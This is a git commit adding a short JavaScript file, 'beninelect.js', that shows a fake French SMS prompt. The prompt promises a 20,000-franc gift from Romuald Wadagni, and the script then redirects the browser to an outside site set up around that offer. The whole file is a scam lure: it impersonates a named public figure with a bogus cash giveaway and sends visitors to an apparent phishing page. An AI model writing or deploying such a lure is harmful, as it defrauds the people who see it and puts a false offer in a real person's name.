bcb92076ac7cbe31b2d558dba3b87c1105b2f32f
usorondo45 <furrier.band-9c@icloud.com>
2026-03-11 22:06:25 +0100

    Create beninelect.js

---
+++ beninelect.js
@@ -0,0 +1,5 @@
+var password = 'RECEVEZ 20 000 francs'
+password = prompt('SMS: Félicitations ! Vous êtes éligible pour recevoir un don de 20 000 francs de Romuald Wadagni. Cliquez sur OK pour profiter de l’offre','RECEVEZ 20 000 francs');
+if (password != 'RECEVEZ 20 000 francs') {
+    location.href ='https://www.etuubom.site/20000francs-romuald-wadagni';
+}
